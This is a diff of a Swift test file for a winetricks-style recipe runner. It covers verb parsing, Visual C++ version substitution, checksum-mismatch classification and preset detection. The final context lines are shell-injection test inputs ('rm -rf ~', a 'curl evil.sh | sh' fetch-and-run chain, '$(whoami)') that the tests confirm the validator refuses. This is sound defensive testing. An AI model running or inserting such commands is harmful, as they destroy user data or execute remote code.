@@ -64,6 +64,39 @@ func runRecipeVerbTests(_ t: Harness) {
     t.expect(ok("d3dcompiler_47"), "underscores are allowed")
     t.expect(ok("dotnet48"), "a real preset verb is allowed")
 
+    let script = "#!/bin/sh\nw_metadata vcrun2019 dlls \\\n    title=\"x\"\nw_metadata   vcrun2022 dlls \\\n# w_metadata nope dlls\necho w_metadata x\n"
+    let known = RecipeRunner.knownVerbs(inScript: script)
+    t.expect(known == ["vcrun2019", "vcrun2022"], "knownVerbs reads only w_metadata lines")
+    t.expect(RecipeRunner.resolve(["vcrun2026"], known: ["vcrun2019", "vcrun2022"]) == ["vcrun2022"],
+             "a missing newest vcrun becomes the newest known")
+    t.expect(RecipeRunner.resolve(["vcrun2026"], known: ["vcrun2019"]) == ["vcrun2019"],
+             "…down to the only one known")
+    t.expect(RecipeRunner.resolve(["vcrun2026"], known: ["vcrun2026", "vcrun2019"]) == ["vcrun2026"],
+             "a known vcrun is unchanged")
+    t.expect(RecipeRunner.resolve(["corefonts", "vcrun2010"], known: ["vcrun2019"]) == ["corefonts", "vcrun2010"],
+             "non-family verbs are untouched")
+    t.expect(RecipeRunner.resolve(["vcrun2026"], known: []) == ["vcrun2026"],
+             "an unreadable script changes nothing")
+    t.expect(RecipeRunner.resolve(["vcrun2026", "vcrun2019"], known: ["vcrun2019"]) == ["vcrun2019"],
+             "substitution de-duplicates")
+    for msg in ["sha256sum mismatch! However --force was used, so trying anyway.",
+                "Checksum for /x/y did not match, but --force was used, so ignoring and trying anyway.",
+                "SHA256 mismatch!\nUnattended mode, not prompting for confirmation"] {
+        let c = RecipeRunner.classify(exitCode: 0, output: msg)
+        t.expect(c.checksumMismatch && !c.failed, "a checksum mismatch is flagged, not failed: \(msg.prefix(24))")
+    }
+    let clean = RecipeRunner.classify(exitCode: 0, output: "Executing w_do_call vcrun2026\nok")
+    t.expect(!clean.failed && !clean.checksumMismatch, "a clean transcript is neither")
+    t.expect(RecipeRunner.classify(exitCode: 1, output: "").failed, "a non-zero exit is a failure")
+    t.expect(!RecipeRunner.classify(exitCode: 0, output: "failed, but already installed").failed,
+             "already installed is not a failure")
+
+    t.expect(RecipeRunner.isApplied(["vcrun"], in: ["vcrun2026"]), "a preset is applied when its verbs are")
+    t.expect(!RecipeRunner.isApplied(["vcrun"], in: ["vcrun2019"]), "an older Visual C++ is not the one installed")
+    t.expect(!RecipeRunner.isApplied(["media"], in: ["quartz", "devenum", "lavfilters702"]), "a partly applied preset is not applied")
+    t.expect(RecipeRunner.isApplied(["media"], in: ["quartz", "devenum", "lavfilters702", "xact"]), "all four media verbs make it applied")
+    t.expect(!RecipeRunner.isApplied([], in: ["vcrun2026"]), "nothing named is never applied")
+
     t.expect(!ok("vcrun; rm -rf ~"), "a shell separator is refused")
     t.expect(!ok("vcrun && curl evil.sh | sh"), "a command chain is refused")
     t.expect(!ok("$(whoami)"), "command substitution is refused")
